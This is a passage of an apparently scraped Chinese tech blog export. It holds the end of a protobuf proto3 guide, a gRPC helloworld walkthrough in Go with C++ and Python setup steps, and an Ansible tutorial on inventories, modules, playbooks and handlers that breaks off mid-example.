=“Ponycopter”;\n\n```\n\n- `optimize_for`\n\n  （文件选项）：可以设置为`SPEED`，`CODE_SIZE`或`LITE_RUNTIME`。这会以下列方式影响C ++和Java代码生成器（可能还有第三方生成器）：\n\n  - `SPEED`（默认值）：protobuf 编译器将生成用于对消息类型进行序列化，解析和执行其他常见操作的代码。此代码经过高度优化。\n  - `CODE_SIZE`：protobuf 编译器将生成最少的类，并依赖于基于反射的共享代码来实现序列化，解析和各种其他操作。因此生成的代码比使用`SPEED`小得多，但操作会更慢。类仍将实现与`SPEED`模式完全相同的公共API 。此模式在包含非常大数量的`.proto`文件的应用程序中最有用，并且不需要所有文件都非常快速。\n  - `LITE_RUNTIME`：protobuf 编译器将生成仅依赖于“lite”运行时库（`libprotobuf-lite`而不是`libprotobuf`）的类。精简版运行时比整个库小得多（大约小一个数量级），但省略了描述符和反射等特定功能。这对于在移动电话等受限平台上运行的应用程序尤其有用。编译器仍然会像在`SPEED`模式中一样生成所有方法的快速实现。生成的类将仅实现`MessageLite`每种语言的接口，该接口仅提供完整`Message`接口的方法的子集。\n\n  ```protobuf\n  option optimize_for = CODE_SIZE;\n  ```\n  \n- `cc_enable_arenas`（文件选项）：为C ++生成的代码启用[竞技场分配](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Freference%2Farenas)。\n\n- `objc_class_prefix`（文件选项）：设置Objective-C类前缀，该前缀预先添加到此.proto的所有Objective-C生成的类和枚举中。没有默认值。您应该使用[Apple建议的](https://link.juejin.im?target=https%3A%2F%2Fdeveloper.apple.com%2Flibrary%2Fios%2Fdocumentation%2FCocoa%2FConceptual%2FProgrammingWithObjectiveC%2FConventions%2FConventions.html%23%2F%2Fapple_ref%2Fdoc%2Fuid%2FTP40011210-CH10-SW4) 3-5个大写字符之间的前缀。请注意，Apple保留所有2个字母的前缀。\n\n- `deprecated`（字段选项）：如果设置为`true`，则表示该字段已弃用，新代码不应使用该字段。在大多数语言中，这没有实际效果。在Java中，这成为一个`@Deprecated`注释。将来，其他特定于语言的代码生成器可能会在字段的访问器上生成弃用注释，这将导致在编译尝试使用该字段的代码时发出警告。如果任何人都没有使用该字段，并且您希望阻止新用户使用该字段，请考虑使用保留语句替换字段声明。\n\n  ```protobuf\n  int32 old_field = 6 [deprecated = true];\n  ```\n\n##### 14.1 自定义选项\n\nProtocol Buffers还允许您定义和使用自己的选项。这是大多数人不需要的**高级功能**。如果您确实认为需要创建自己的选项，请参阅[Proto2语言指南](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Fproto.html%23customoptions)以获取详细信息。请注意，创建自定义选项使用的[扩展名](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Fproto.html%23extensions)仅允许用于proto3中的自定义选项。\n\n### 15. 生成您的类\n\n根据实际工作需要，生成以下对应语言的自定义消息类型Java，Python，C ++，Go, Ruby, Objective-C，或C＃的`.proto`文件，你需要运行protobuf 编译器`protoc`上`.proto`。如果尚未安装编译器，请[下载该软件包](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Fdownloads.html)并按照自述文件中的说明进行操作。对于Go，您还需要为编译器安装一个特殊的代码生成器插件：您可以在GitHub上的[golang / protobuf](https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2Fgolang%2Fprotobuf%2F)存储库中找到这个和安装说明。\n\nProtobuf 编译器的调用如下：\n\n```protobuf\nprotoc --proto_path = IMPORT_PATH --cpp_out = DST_DIR --java_out = DST_DIR --python_out = DST_DIR --go_out = DST_DIR --ruby_out = DST_DIR --objc_out = DST_DIR --csharp_out = DST_DIR  path / to / file .proto\n```\n\n- `IMPORT_PATH`指定`.proto`解析`import`指令时在其中查找文件的目录。如果省略，则使用当前目录。可以通过`--proto_path`多次传递选项来指定多个导入目录; 他们将按顺序搜索。 可以用作简短的形式。 `-I=*IMPORT_PATH*``--proto_path`\n\n- 您可以提供一个或多个输出指令：\n\n  - `--cpp_out`生成C ++代码`DST_DIR`。有关更多信息，请参阅[C ++生成的代码参考](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Freference%2Fcpp-generated)。\n  - `--java_out`生成Java代码`DST_DIR`。请参阅[的Java生成的代码参考](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Freference%2Fjava-generated)更多。\n  - `--python_out`生成Python代码`DST_DIR`。看到[的Python生成的代码的参考](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Freference%2Fpython-generated)更多。\n  - `--go_out`生成Go代码`DST_DIR`。有关更多信息，请参阅[Go生成代码参考](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Freference%2Fgo-generated)。\n  - `--ruby_out`生成Ruby代码`DST_DIR`。Ruby生成的代码参考即将推出！\n  - `--objc_out`生成Objective-C代码`DST_DIR`。有关更多信息，请参阅[Objective-C生成的代码参考](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Freference%2Fobjective-c-generated)。\n  - `--csharp_out`生成C＃代码`DST_DIR`。有关更多信息，请参阅[C＃生成的代码参考](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Freference%2Fcsharp-generated)。\n  - `--php_out`生成PHP代码`DST_DIR`。看到[PHP生成的代码的参考](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Freference%2Fphp-generated)更多。\n\n  为了方便起见，如果DST_DIR结束于`.zip`或.`jar`，编译器会将输出写入具有给定名称的单个ZIP格式存档文件。`.jar`输出还将根据Java JAR规范的要求提供清单文件。请注意，如果输出存档已存在，则会被覆盖; 编译器不够智能，无法将文件添加到现有存档中。\n\n- 您必须提供一个或多个`.proto`文件作为输入。`.proto`可以一次指定多个文件。虽然文件是相对于当前目录命名的，但每个文件必须位于其中一个文件中，`IMPORT_PATH`以便编译器可以确定其规范名称。\n\n\n\n### 参考资料:\n\n+ https://juejin.im/post/5bb597c2e51d450e6e03e42d\n+ https://colobu.com/2017/03/16/Protobuf3-language-guide/","tags":["protobuf"],"categories":["计算机基础"]},{"title":"grpc在golang_cpp_python下的实践","url":"%2Fp%2Fc0435795.html","content":"\n\n\n### 1. 下载protocbuf 生成器\n\nhttps://github.com/protocolbuffers/protobuf/releases\n\n例如我下载的是 [protoc-3.9.0-osx-x86_64.zip](https://github.com/protocolbuffers/protobuf/releases/download/v3.9.0/protoc-3.9.0-osx-x86_64.zip)\n\n```bash\ncd protoc-3.9.0-osx-x86_64 \ncp -r include/ /usr/local/include/ \ncp -r bin/ /usr/local/bin/\nprotoc --version\n```\n\n<!-- more -->\n\n### 2. golang版本\n\n```bash\ngo get -u google.golang.org/grpc\ngo get -u github.com/golang/protobuf/protoc-gen-go\n```\n\n我们去 `$GOPATH/src/google.golang.org/grpc/examples` 看helloworld例子\n\n```bash\ncd $GOPATH/src/google.golang.org/grpc/examples/helloworld\n```\n\n\n\n>  helloworld.proto\n\n```protobuf\nsyntax = \"proto3\";\n\noption java_multiple_files = true;\noption java_package = \"io.grpc.examples.helloworld\";\noption java_outer_classname = \"HelloWorldProto\";\n\npackage helloworld;\n\n// The greeting service definition.\nservice Greeter {\n  // Sends a greeting\n  rpc SayHello (HelloRequest) returns (HelloReply) {}\n}\n\n// The request message containing the user's name.\nmessage HelloRequest {\n  string name = 1;\n}\n\n// The response message containing the greetings\nmessage HelloReply {\n  string message = 1;\n}\n```\n\n我们通过.proto文件生成golang文件, 生成后的文件不要编辑.\n\n```sh\nprotoc -I helloworld/ helloworld/helloworld.proto --go_out=plugins=grpc:helloworld\n\n# 获取进入到helloworld目录里\nprotoc helloworld.proto --go_out=plugins=grpc:. \n```\n\n\n\n> helloworld.pb.go\n\n```go\n// Code generated by protoc-gen-go. DO NOT EDIT.\n// source: helloworld.proto\n\npackage helloworld\n\nimport (\n\tcontext \"context\"\n\tfmt \"fmt\"\n\tproto \"github.com/golang/protobuf/proto\"\n\tgrpc \"google.golang.org/grpc\"\n\tcodes \"google.golang.org/grpc/codes\"\n\tstatus \"google.golang.org/grpc/status\"\n\tmath \"math\"\n)\n\n// Reference imports to suppress errors if they are not otherwise used.\nvar _ = proto.Marshal\nvar _ = fmt.Errorf\nvar _ = math.Inf\n\n// This is a compile-time assertion to ensure that this generated file\n// is compatible with the proto package it is being compiled against.\n// A compilation error at this line likely means your copy of the\n// proto package needs to be updated.\nconst _ = proto.ProtoPackageIsVersion3 // please upgrade the proto package\n\n// The request message containing the user's name.\ntype HelloRequest struct {\n\tName                 string   `protobuf:\"bytes,1,opt,name=name,proto3\" json:\"name,omitempty\"`\n\tXXX_NoUnkeyedLiteral struct{} `json:\"-\"`\n\tXXX_unrecognized     []byte   `json:\"-\"`\n\tXXX_sizecache        int32    `json:\"-\"`\n}\n\nfunc (m *HelloRequest) Reset()         { *m = HelloRequest{} }\nfunc (m *HelloRequest) String() string { return proto.CompactTextString(m) }\nfunc (*HelloRequest) ProtoMessage()    {}\nfunc (*HelloRequest) Descriptor() ([]byte, []int) {\n\treturn fileDescriptor_17b8c58d586b62f2, []int{0}\n}\n\nfunc (m *HelloRequest) XXX_Unmarshal(b []byte) error {\n\treturn xxx_messageInfo_HelloRequest.Unmarshal(m, b)\n}\nfunc (m *HelloRequest) XXX_Marshal(b []byte, deterministic bool) ([]byte, error) {\n\treturn xxx_messageInfo_HelloRequest.Marshal(b, m, deterministic)\n}\nfunc (m *HelloRequest) XXX_Merge(src proto.Message) {\n\txxx_messageInfo_HelloRequest.Merge(m, src)\n}\nfunc (m *HelloRequest) XXX_Size() int {\n\treturn xxx_messageInfo_HelloRequest.Size(m)\n}\nfunc (m *HelloRequest) XXX_DiscardUnknown() {\n\txxx_messageInfo_HelloRequest.DiscardUnknown(m)\n}\n\nvar xxx_messageInfo_HelloRequest proto.InternalMessageInfo\n\nfunc (m *HelloRequest) GetName() string {\n\tif m != nil {\n\t\treturn m.Name\n\t}\n\treturn \"\"\n}\n\n// The response message containing the greetings\ntype HelloReply struct {\n\tMessage              string   `protobuf:\"bytes,1,opt,name=message,proto3\" json:\"message,omitempty\"`\n\tXXX_NoUnkeyedLiteral struct{} `json:\"-\"`\n\tXXX_unrecognized     []byte   `json:\"-\"`\n\tXXX_sizecache        int32    `json:\"-\"`\n}\n\nfunc (m *HelloReply) Reset()         { *m = HelloReply{} }\nfunc (m *HelloReply) String() string { return proto.CompactTextString(m) }\nfunc (*HelloReply) ProtoMessage()    {}\nfunc (*HelloReply) Descriptor() ([]byte, []int) {\n\treturn fileDescriptor_17b8c58d586b62f2, []int{1}\n}\n\nfunc (m *HelloReply) XXX_Unmarshal(b []byte) error {\n\treturn xxx_messageInfo_HelloReply.Unmarshal(m, b)\n}\nfunc (m *HelloReply) XXX_Marshal(b []byte, deterministic bool) ([]byte, error) {\n\treturn xxx_messageInfo_HelloReply.Marshal(b, m, deterministic)\n}\nfunc (m *HelloReply) XXX_Merge(src proto.Message) {\n\txxx_messageInfo_HelloReply.Merge(m, src)\n}\nfunc (m *HelloReply) XXX_Size() int {\n\treturn xxx_messageInfo_HelloReply.Size(m)\n}\nfunc (m *HelloReply) XXX_DiscardUnknown() {\n\txxx_messageInfo_HelloReply.DiscardUnknown(m)\n}\n\nvar xxx_messageInfo_HelloReply proto.InternalMessageInfo\n\nfunc (m *HelloReply) GetMessage() string {\n\tif m != nil {\n\t\treturn m.Message\n\t}\n\treturn \"\"\n}\n\nfunc init() {\n\tproto.RegisterType((*HelloRequest)(nil), \"helloworld.HelloRequest\")\n\tproto.RegisterType((*HelloReply)(nil), \"helloworld.HelloReply\")\n}\n\nfunc init() { proto.RegisterFile(\"helloworld.proto\", fileDescriptor_17b8c58d586b62f2) }\n\nvar fileDescriptor_17b8c58d586b62f2 = []byte{\n\t// 175 bytes of a gzipped FileDescriptorProto\n\t0x1f, 0x8b, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0xff, 0xe2, 0x12, 0xc8, 0x48, 0xcd, 0xc9,\n\t0xc9, 0x2f, 0xcf, 0x2f, 0xca, 0x49, 0xd1, 0x2b, 0x28, 0xca, 0x2f, 0xc9, 0x17, 0xe2, 0x42, 0x88,\n\t0x28, 0x29, 0x71, 0xf1, 0x78, 0x80, 0x78, 0x41, 0xa9, 0x85, 0xa5, 0xa9, 0xc5, 0x25, 0x42, 0x42,\n\t0x5c, 0x2c, 0x79, 0x89, 0xb9, 0xa9, 0x12, 0x8c, 0x0a, 0x8c, 0x1a, 0x9c, 0x41, 0x60, 0xb6, 0x92,\n\t0x1a, 0x17, 0x17, 0x54, 0x4d, 0x41, 0x4e, 0xa5, 0x90, 0x04, 0x17, 0x7b, 0x6e, 0x6a, 0x71, 0x71,\n\t0x62, 0x3a, 0x4c, 0x11, 0x8c, 0x6b, 0xe4, 0xc9, 0xc5, 0xee, 0x5e, 0x94, 0x9a, 0x5a, 0x92, 0x5a,\n\t0x24, 0x64, 0xc7, 0xc5, 0x11, 0x9c, 0x58, 0x09, 0xd6, 0x25, 0x24, 0xa1, 0x87, 0xe4, 0x02, 0x64,\n\t0xcb, 0xa4, 0xc4, 0xb0, 0xc8, 0x14, 0xe4, 0x54, 0x2a, 0x31, 0x38, 0x19, 0x70, 0x49, 0x67, 0xe6,\n\t0xeb, 0xa5, 0x17, 0x15, 0x24, 0xeb, 0xa5, 0x56, 0x24, 0xe6, 0x16, 0xe4, 0xa4, 0x16, 0x23, 0xa9,\n\t0x75, 0xe2, 0x07, 0x2b, 0x0e, 0x07, 0xb1, 0x03, 0x40, 0x5e, 0x0a, 0x60, 0x4c, 0x62, 0x03, 0xfb,\n\t0xcd, 0x18, 0x10, 0x00, 0x00, 0xff, 0xff, 0x0f, 0xb7, 0xcd, 0xf2, 0xef, 0x00, 0x00, 0x00,\n}\n\n// Reference imports to suppress errors if they are not otherwise used.\nvar _ context.Context\nvar _ grpc.ClientConn\n\n// This is a compile-time assertion to ensure that this generated file\n// is compatible with the grpc package it is being compiled against.\nconst _ = grpc.SupportPackageIsVersion4\n\n// GreeterClient is the client API for Greeter service.\n//\n// For semantics around ctx use and closing/ending streaming RPCs, please refer to https://godoc.org/google.golang.org/grpc#ClientConn.NewStream.\ntype GreeterClient interface {\n\t// Sends a greeting\n\tSayHello(ctx context.Context, in *HelloRequest, opts ...grpc.CallOption) (*HelloReply, error)\n}\n\ntype greeterClient struct {\n\tcc *grpc.ClientConn\n}\n\nfunc NewGreeterClient(cc *grpc.ClientConn) GreeterClient {\n\treturn &greeterClient{cc}\n}\n\nfunc (c *greeterClient) SayHello(ctx context.Context, in *HelloRequest, opts ...grpc.CallOption) (*HelloReply, error) {\n\tout := new(HelloReply)\n\terr := c.cc.Invoke(ctx, \"/helloworld.Greeter/SayHello\", in, out, opts...)\n\tif err != nil {\n\t\treturn nil, err\n\t}\n\treturn out, nil\n}\n\n// GreeterServer is the server API for Greeter service.\ntype GreeterServer interface {\n\t// Sends a greeting\n\tSayHello(context.Context, *HelloRequest) (*HelloReply, error)\n}\n\n// UnimplementedGreeterServer can be embedded to have forward compatible implementations.\ntype UnimplementedGreeterServer struct {\n}\n\nfunc (*UnimplementedGreeterServer) SayHello(ctx context.Context, req *HelloRequest) (*HelloReply, error) {\n\treturn nil, status.Errorf(codes.Unimplemented, \"method SayHello not implemented\")\n}\n\nfunc RegisterGreeterServer(s *grpc.Server, srv GreeterServer) {\n\ts.RegisterService(&_Greeter_serviceDesc, srv)\n}\n\nfunc _Greeter_SayHello_Handler(srv interface{}, ctx context.Context, dec func(interface{}) error, interceptor grpc.UnaryServerInterceptor) (interface{}, error) {\n\tin := new(HelloRequest)\n\tif err := dec(in); err != nil {\n\t\treturn nil, err\n\t}\n\tif interceptor == nil {\n\t\treturn srv.(GreeterServer).SayHello(ctx, in)\n\t}\n\tinfo := &grpc.UnaryServerInfo{\n\t\tServer:     srv,\n\t\tFullMethod: \"/helloworld.Greeter/SayHello\",\n\t}\n\thandler := func(ctx context.Context, req interface{}) (interface{}, error) {\n\t\treturn srv.(GreeterServer).SayHello(ctx, req.(*HelloRequest))\n\t}\n\treturn interceptor(ctx, in, info, handler)\n}\n\nvar _Greeter_serviceDesc = grpc.ServiceDesc{\n\tServiceName: \"helloworld.Greeter\",\n\tHandlerType: (*GreeterServer)(nil),\n\tMethods: []grpc.MethodDesc{\n\t\t{\n\t\t\tMethodName: \"SayHello\",\n\t\t\tHandler:    _Greeter_SayHello_Handler,\n\t\t},\n\t},\n\tStreams:  []grpc.StreamDesc{},\n\tMetadata: \"helloworld.proto\",\n}\n\n```\n\n\n\n我们看下`greeter_server` 的代码并且启动: `go run greeter_server/main.go`\n\n```go\npackage main\n\nimport (\n\t\"context\"\n\t\"log\"\n\t\"net\"\n\n\t\"google.golang.org/grpc\"\n\tpb \"google.golang.org/grpc/examples/helloworld/helloworld\"\n)\n\nconst (\n\tport = \":50051\"\n)\n\n// server is used to implement helloworld.GreeterServer.\ntype server struct{}\n\n// SayHello implements helloworld.GreeterServer\nfunc (s *server) SayHello(ctx context.Context, in *pb.HelloRequest) (*pb.HelloReply, error) {\n\tlog.Printf(\"Received: %v\", in.Name)\n\treturn &pb.HelloReply{Message: \"Hello \" + in.Name}, nil\n}\n\nfunc main() {\n\tlis, err := net.Listen(\"tcp\", port)\n\tif err != nil {\n\t\tlog.Fatalf(\"failed to listen: %v\", err)\n\t}\n\ts := grpc.NewServer()\n\tpb.RegisterGreeterServer(s, &server{})\n\tif err := s.Serve(lis); err != nil {\n\t\tlog.Fatalf(\"failed to serve: %v\", err)\n\t}\n}\n```\n\n\n\n我们看下`greeter_client`的代码并且启动:` go run greeter_client/main.go`\n\n\n\n```go\npackage main\n\nimport (\n\t\"context\"\n\t\"log\"\n\t\"os\"\n\t\"time\"\n\n\t\"google.golang.org/grpc\"\n\tpb \"google.golang.org/grpc/examples/helloworld/helloworld\"\n)\n\nconst (\n\taddress     = \"localhost:50051\"\n\tdefaultName = \"world\"\n)\n\nfunc main() {\n\t// Set up a connection to the server.\n\tconn, err := grpc.Dial(address, grpc.WithInsecure())\n\tif err != nil {\n\t\tlog.Fatalf(\"did not connect: %v\", err)\n\t}\n\tdefer conn.Close()\n\tc := pb.NewGreeterClient(conn)\n\n\t// Contact the server and print out its response.\n\tname := defaultName\n\tif len(os.Args) > 1 {\n\t\tname = os.Args[1]\n\t}\n\tctx, cancel := context.WithTimeout(context.Background(), time.Second)\n\tdefer cancel()\n\tr, err := c.SayHello(ctx, &pb.HelloRequest{Name: name})\n\tif err != nil {\n\t\tlog.Fatalf(\"could not greet: %v\", err)\n\t}\n\tlog.Printf(\"Greeting: %s\", r.Message)\n}\n```\n\n\n\nIf things go smoothly, you will see the `Greeting: Hello world` in the client side output.\n\nCongratulations! You’ve just run a client-server application with gRPC.\n\n\n\n##### 2.1 修改proto步骤总结\n\n+ 在proto文件里增加 `rpc SayHelloAgain (HelloRequest) returns (HelloReply) {}`的定义\n\n+ 通过protoc重新生成golang文件, 里面增加了SayHelloAgain相关方法\n\n+ 修改server文件增加方法来实现接口\n\n  ```go\n  func (s *server) SayHelloAgain(ctx context.Context, in *pb.HelloRequest) (*pb.HelloReply, error) {\n          return &pb.HelloReply{Message: \"Hello again \" + in.Name}, nil\n  }\n  ```\n\n+ 修改client方法增加调用\n\n  ```go\n  r, err = c.SayHelloAgain(ctx, &pb.HelloRequest{Name: name})\n  if err != nil {\n          log.Fatalf(\"could not greet: %v\", err)\n  }\n  log.Printf(\"Greeting: %s\", r.Message)\n  ```\n\n+ 总结\n  \n  + client调用的的`SayHelloAgain`是`helloworld.pb.go`里生成的方法\n  + server增加的方法是为了实现了`helloworld.pb.go` 生成的server新接口, 来实现callback\n\n\n\n### 3. TODO: cpp 版本\n\n参考: https://github.com/grpc/grpc/blob/master/BUILDING.md\n\n```bash\n# 安装xcode command line tools\nsudo xcode-select --install\n# 先安装必备的软件\nbrew install autoconf automake libtool shtool gflags\n\n# 下载官方代码并更新依赖\ngit clone https://github.com/grpc/grpc\ngit submodule update --init\n\n# 编译并且安装\nLIBTOOL=glibtool LIBTOOLIZE=glibtoolize make\nsudo make install\n```\n\n\n\n我们先进入hellworld例子\n\n```bash\ncd examples/cpp/hellworld/\nmake\n\n# make过程中可以看到会先生成helloworld.pb.cc\nprotoc -I ../../protos --cpp_out=. ../../protos/helloworld.proto\n```\n\n\n\n还可以这样生成:\n\n```bash\nprotoc --cpp_out=. helloworld.proto\nprotoc --grpc_out=. --plugin=protoc-gen-grpc=`which grpc_cpp_plugin` helloworld.proto\n```\n\n\n\n### 4. TODO: python版本\n\n```bash\nsudo python3 -m pip install grpcio\nsudo python3 -m pip install grpcio-tools\npython3 -m grpc_tools.protoc -I. --python_out=. --grpc_python_out=. helloworld.proto\n```\n\n\n\n\n\n### 5. 参考资料:\n\n- https://grpc.io/docs/quickstart/","tags":["grpc"],"categories":["golang"]},{"title":"ansible实践","url":"%2Fp%2F18605da6.html","content":"\n\n\n### 1. ansible 安装\n\n在 ansible 的世界里，我们会通过 inventory 档案来定义有哪些 managed node (被控端)，并借由 ssh 和 python 进行沟通。换句话说，当 control machine (主控端) 可以用 ssh 连上 managed node，且被连上的机器里有预载 python 时，ansile 就可以运作了.\n\n+ 控制端\n\n```bash\nsudo apt install ansible #linux\nbrew install ansible # mac\n```\n\n+ 被控端\n\n  要安装 python, 并且能被控制端 ssh \n\n<!-- more -->\n\n### 2. ansible 配置\n\nansible的默认配置文件路径为 /etc/ansible，然而，一个常见的用途是将其安装在一个virtualenv中，在这种情况下，我们一般不会使用这些默认文件。我们可以根据需要在本地目录中创建配置文件。\n\n##### 2.1 inventory文件\n\n您可以创建一个inventory文件，用于定义将要管理的服务器。这个文件可以命名为任何名字，但我们通常会命名为hosts或者项目的名称。 \n\n在hosts文件中，我们可以定义一些要管理的服务器。这里我们将定义我们可能要在“web”标签下管理的两个服务器。标签是任意的。\n\n```bash\n[web]\n192.168.22.10\n192.168.22.11\n```\n\n现在，让我们将hosts文件设置为指向本地主机local和remote虚拟远程主机。 \n\n```bash\n[local]\n127.0.0.1\n\n[remote]\n192.168.1.2\n```\n\n### 3. ansible 使用\n\n我们开始对服务器运行任务。ansible会假定你的服务器具有ssh访问权限，通常基于ssh-key。因为ansible使用ssh，所以它需要能够ssh连接到服务器。但是，ansible将尝试以正在运行的当前用户身份进行连接。如果我正在运行ansible的用户是ubuntu，它将尝试以ubuntu连接其他服务器。\n\nNote: 控制端和被控端的用户很显然会不一样。\n\n```bash\nwhoami # levonfly\n\nansible -i ./hosts --connection=local local -m ping\n127.0.0.1 | SUCCESS => {\n    \"changed\": false,\n    \"ping\": \"pong\"\n}\n\n\nansible -i ./hosts remote -m ping\n192.168.1.2 | UNREACHABLE! => {\n    \"changed\": false,\n    \"msg\": \"Failed to connect to the host via ssh: ssh: connect to host 192.168.1.2 port 22: Operation timed out\\r\\n\",\n    \"unreachable\": true\n}\n```\n\n\n\n+ 使用–connection=local告诉ansible不尝试通过ssh运行命令，因为我们只是影响本地主机。但是，我们仍然需要一个hosts文件，告诉我们连接到哪里。 \n\n+ 在任何情况下，我们可以看到从ansible得到的输出是一些json，它告诉我们task（我们对ping模块的调用）是否进行了任何更改和结果。\n\n\n\n命令说明：\n\n```bash\n-i ./hosts \t\t\t\t# 设置库存文件，命名为 hosts\nremote，local，all # 使用这个标签的下定义的服务器hosts清单文件。“all”是针对文件中定义的每个服务器运行的特殊关键字, 注意all比较特殊\n-m ping # 使用“ping”模块，它只是运行ping命令并返回结果\n-c local| --connection=local # 在本地服务器上运行命令，而不是SSH\n\n一些常用命令：\n-i PATH --inventory=PATH # 指定host文件的路径，默认是在/etc/ansible/hosts\n--private-key=PRIVATE_KEY_FILE_PATH # 使用指定路径的秘钥建立认证连接\n-m DIRECTORY --module-path=DIRECTORY #指定module的目录来加载module，默认是/usr/share/ansible\n-c CONNECTION --connection=CONNECTION #指定建立连接的类型，一般有ssh ，local\n```\n\n\n\n##### 3.1 模块（modules）\n\nansible使用“模块”来完成大部分的任务。模块可以做安装软件，复制文件，使用模板等等。\n\n如果我们没有模块，我们将运行任意的shell命令，我们也可以使用bash脚本。这是一个任意shell命令看起来像在ansible（它使用的shell模块！）：\n\n```bash\n# 在本地执行ls命令\nansible -i ./hosts local --connection=local -m shell -a 'ls'\n\n127.0.0.1 | SUCCESS | rc=0 >>\nREADME.md\nhosts\nnginx.yml\nroles\n\n# 在远程安装nginx, 注意--become-user=root是改变控制端的用户, 不是被控端\nansible -i ./hosts remote -b --become-user=root -m shell -a 'yum install nginx'\n172.24.120.46 | UNREACHABLE! => {\n    \"changed\": false,\n    \"msg\": \"Failed to connect to the host via ssh: liuwei@172.24.120.46: Permission denied (publickey,gssapi-keyex,gssapi-with-mic,password).\\r\\n\",\n    \"unreachable\": true\n}\n```\n\n命令说明:\n\n```bash\n-b # “成为”，在运行命令时告诉可以成为另一个用户。\n--become-user=root # 以用户“root”运行以下命令, 是改变控制端的用户, 不是被控端!!!\n\n-a #用于将任何参数传递给-m定义的模块\n```\n\n\n\n要在centos服务器上安装软件，“yum”模块将运行相同的命令，但确保幂等。\n\n```bash\n# 指定root用户yum安装nginx\nansible -i ./hosts remote -v -m yum -a 'name=nginx state=installed update_cache=true' -u root -k\n\nNo config file found; using defaults\nSSH password: xxx\n172.24.120.46 | SUCCESS => {\n    \"changed\": false,\n    \"msg\": \"\",\n    \"rc\": 0,\n    \"results\": [\n        \"1:nginx-1.12.2-3.el7.x86_64 providing nginx is already installed\"\n    ]\n}\n\n\n# 指定普通用户yum安装nginx, 并且输入sudo密码\nansible -i ./hosts remote -v -m yum -a 'name=nginx state=installed update_cache=true' -u liuwei -k -s -K \nSSH password: xxx\nSUDO password[defaults to SSH password]: xxx\n172.24.120.46 | SUCCESS => {\n    \"changed\": false,\n    \"msg\": \"\",\n    \"rc\": 0,\n    \"results\": [\n        \"1:nginx-1.12.2-3.el7.x86_64 providing nginx is already installed\"\n    ]\n}\n```\n\n命令说明:\n\n```bash\n-v   \t # verbose mode, (-vvv for more, -vvvv to enable connection debugging)\n-m apt # 使用apt模块\n-a 'name=nginx state=installed update_cache=true' # 提供apt模块的参数，包括软件包名称，所需的结束状态以及是否更新软件包存储库缓存\n\n常用命令：\n-u USERNAME | --user=USERNAME #指定被控端的执行用户\n-k | --ask-pass  #提示输入ssh的密码，而不是使用基于ssh的密钥认证\n\n-s | --sudo  #指定用户的时候，使用sudo获得root权限\n-K | --ask-sudo-pass #提示输入sudo密码，与--sudo一起使用\n```\n\n这将使用yum模块来更新存储库缓存并安装nginx（如果没有安装）。 运行任务的结果是”changed”: false。这表明没有变化; 我已经使用该shell模块安装了nginx 。好的是，我可以一遍又一遍地运行这个命令，而不用担心它会改变预期的结果 - nginx已经安装，ansible知道，并且不尝试重新安装它。 \n\n\n\n##### 3.2 剧本（playbooks）\n\nplaybook可以运行多个任务，并提供一些更高级的功能。让我们将上述任务移到一本剧本中。在ansible中剧本（playbooks）和角色（roles）都使用yaml文件定义。 \n\nnginx.yml：(通过yaml写所需参数)\n\n```yaml\n- hosts: remote\n  become: yes\n  become_user: root\n  tasks:\n   - name: Install Nginx\n     yum:\n       name: nginx\n       state: installed\n       update_cache: true\n```\n\n\n\n这将使用inventory文件中[remote]标签下的服务器hosts。在我们的tasks文件中使用become并become_user再次使用ansible来sudo以root用户身份运行命令，然后传递playbook文件。使用一个yaml playbook文件，我们需要使用这个ansible-playbook命令：\n\n\n\n```bash\nansible-playbook -i ./hosts nginx.yml -k -K\nSSH password:\nSUDO password[defaults to SSH password]:\n\nPLAY [remote] ***************************************************************************************************************************************************************************\n\nTASK [Gathering Facts] ******************************************************************************************************************************************************************\nok: [172.24.120.46]\n\nTASK [Install Nginx] ********************************************************************************************************************************************************************\nok: [172.24.120.46]\n\nPLAY RECAP ******************************************************************************************************************************************************************************\n172.24.120.46              : ok=2    changed=0    unreachable=0    failed=0\n```\n\n我们在运行过程中获得了一些有用的反馈，包括“可执行任务”运行及其结果。在这里我们看到所有运行都ok，但没有改变。\n\n\n\n##### 3.3 处理程序（handlers）\n\n处理程序与任务完全相同（它可以做task可以做的任何事），但只有当另一个任务调用它时才会运行。您可以将其视为事件系统的一部分; 处理程序将通过其侦听的事件调用进行操作。 这对于运行任务后可能需要的“辅助”操作非常有用，例如在配置更改后安装或重新加载服务后启动新服务。\n\n```yaml\n- hosts: remote\n  become: yes\n  become_user: root\n  tasks:\n   - name: Install Nginx\n     yum:\n       name: nginx\n       state: installed\n       update_cache: true\n     notify: #复制的时候, 要注意空格, 对齐\n      - Start Nginx\n\n  handlers:\n   - name: Start Nginx\n     service:\n       name: nginx\n       state: started\n```\n\n这里我们添加一个notify指令到安装任务。这将在任务运行后通知名为“Start Nginx”的处理程序。然后我们可以创建名为“Start Nginx”的处理程序。此处理程序是通知“Start Nginx”时调用的任务。 这个特定的处理程序使用服务模块，它可以启动，停止，重启，重新加载（等等）系统服务。在这种情况下，我们告诉ansible，我们要启动Nginx。 \n\n+ 如果我已经安装了nginx，则安装nginx任务将不会运行，通知程序也将不会被调用。\n\n\n\n##### 3.4 更多的任务（more tasks）\n\n接下来，我们可以为此playbook添加更多的任务，并探索其他一些功能。\n\n```yaml\n- hosts: local\n  connection: local\n  become: yes\n  become_user: root\n  vars:\n   - docroot: /var/www/serversforhackers.com/public\n  tasks:\n   - name: Add Nginx Repository\n     